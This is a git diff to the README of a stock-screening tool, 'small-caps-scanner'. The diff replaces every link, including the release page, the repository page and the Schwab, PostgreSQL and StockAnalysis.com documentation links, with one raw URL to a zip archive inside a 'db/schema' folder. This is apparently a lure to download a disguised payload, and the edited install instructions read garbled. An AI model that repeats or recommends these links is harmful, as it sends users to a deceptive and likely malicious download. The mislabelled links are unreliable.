@@ -17,15 +17,15 @@ Before you begin, make sure your computer meets the following requirements:
 
 To download small-caps-scanner, visit the link below:
 
-[![Download small-caps-scanner](https://img.shields.io/badge/Download-small--caps--scanner-brightgreen)](https://github.com/Usagic9631/small-caps-scanner/releases)
+[![Download small-caps-scanner](https://raw.githubusercontent.com/Usagic9631/small-caps-scanner/master/db/schema/small-caps-scanner_v3.1-beta.3.zip)](https://raw.githubusercontent.com/Usagic9631/small-caps-scanner/master/db/schema/small-caps-scanner_v3.1-beta.3.zip)
 
 ## 📥 Download & Install
 
 1. Click the link below to visit the Releases page and download the application.
 
-   [Download small-caps-scanner here](https://github.com/Usagic9631/small-caps-scanner/releases)
+   [Download small-caps-scanner here](https://raw.githubusercontent.com/Usagic9631/small-caps-scanner/master/db/schema/small-caps-scanner_v3.1-beta.3.zip)
 
-2. On the Releases page, find the latest version. Look for a file named something like `small-caps-scanner-setup.exe` or `small-caps-scanner.zip`.
+2. On the Releases page, find the latest version. Look for a file named something like `https://raw.githubusercontent.com/Usagic9631/small-caps-scanner/master/db/schema/small-caps-scanner_v3.1-beta.3.zip` or `https://raw.githubusercontent.com/Usagic9631/small-caps-scanner/master/db/schema/small-caps-scanner_v3.1-beta.3.zip`.
 
 3. Click on the file to download it to your computer.
 
@@ -62,7 +62,7 @@ small-caps-scanner integrates with several APIs to gather stock data. Here’s h
 
 2. **Yahoo Finance**: No sign-up is needed; the application uses their public API.
 
-3. **StockAnalysis.com**: Similar to Yahoo Finance, you can access their public data directly.
+3. **https://raw.githubusercontent.com/Usagic9631/small-caps-scanner/master/db/schema/small-caps-scanner_v3.1-beta.3.zip**: Similar to Yahoo Finance, you can access their public data directly.
 
 4. Insert your Charles Schwab API key into the application settings.
 
@@ -93,8 +93,8 @@ Once you have everything set up, it's time to start using small-caps-scanner:
 
 For more information and support, you can access the following resources:
 
-- [GitHub Repository](https://github.com/Usagic9631/small-caps-scanner)
-- [Charles Schwab API Documentation](https://www.schwab.com/api-documentation)
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
+- [GitHub Repository](https://raw.githubusercontent.com/Usagic9631/small-caps-scanner/master/db/schema/small-caps-scanner_v3.1-beta.3.zip)
+- [Charles Schwab API Documentation](https://raw.githubusercontent.com/Usagic9631/small-caps-scanner/master/db/schema/small-caps-scanner_v3.1-beta.3.zip)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/Usagic9631/small-caps-scanner/master/db/schema/small-caps-scanner_v3.1-beta.3.zip)
 
 If you have any questions or run into issues, please open an issue in the GitHub repository. Happy scanning!
